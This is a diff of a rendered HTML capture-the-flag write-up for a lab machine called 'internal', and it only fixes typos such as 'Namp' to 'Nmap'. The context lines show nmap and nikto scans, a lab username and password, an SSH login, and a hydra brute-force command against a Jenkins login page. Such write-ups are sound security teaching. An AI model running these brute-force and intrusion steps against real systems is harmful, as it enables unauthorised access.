@@ -2825,7 +2825,7 @@
   
     <li class="md-nav__item">
       <a href="../../links/" class="md-nav__link">
-        Hack Challenges
+        Hack CTF Overview
       </a>
     </li>
   
@@ -3023,8 +3023,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#namp" class="md-nav__link">
-    Namp
+  <a href="#nmap" class="md-nav__link">
+    Nmap
   </a>
   
 </li>
@@ -4514,8 +4514,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#namp" class="md-nav__link">
-    Namp
+  <a href="#nmap" class="md-nav__link">
+    Nmap
   </a>
   
 </li>
@@ -4609,7 +4609,7 @@
 nmap -sC -sV <span class="nv">$IP</span>
 nikto -h <span class="nv">$IP</span>
 </code></pre></div>
-<h3 id="namp">Namp</h3>
+<h3 id="nmap">Nmap</h3>
 <div class="highlight"><pre><span></span><code>nmap -sC -sV <span class="nv">$IP</span>
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.156.30
 Host is up <span class="o">(</span><span class="m">0</span>.020s latency<span class="o">)</span>.
@@ -4787,7 +4787,7 @@ aubreanna:bubb13guM!@#123
 </code></pre></div>
 <h2 id="aubreanna">Aubreanna</h2>
 <p>So let's login via aubreanna: <code>ssh aubreanna@10.10.156.30</code> and we find the first flag (user.txt) in the home dir.</p>
-<p>Unfortunantly <code>sudo -l</code> is not allowed</p>
+<p>Unfortunately <code>sudo -l</code> is not allowed</p>
 <div class="highlight"><pre><span></span><code>aubreanna@internal:~$ sudo -l
 <span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> aubreanna:
 Sorry, user aubreanna may not run sudo on internal.
@@ -4830,7 +4830,7 @@ died <span class="k">in</span> main: <span class="m">57</span>
 </code></pre></div>
 <p>We can the open jenkins from your kali machine e.g. http://localhost:31340 and analyse the login prompt with burpsuite:</p>
 <p><img alt="_internal_burpsuite" src="../_internal_burpsuite.jpg" /></p>
-<p>Using the information from the intercepted post command of a failed login attempt we can build the hdyra bruteforce attack:</p>
+<p>Using the information from the intercepted post command of a failed login attempt we can build the hdyra brute-force attack:</p>
 <div class="highlight"><pre><span></span><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s <span class="m">31340</span> http-post-form <span class="s2">&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=&amp;Submit=Sign+in:F=Invalid&quot;</span>
 </code></pre></div>
 <h2 id="jenkins-groovy-reverse-shell">Jenkins groovy reverse shell</h2>
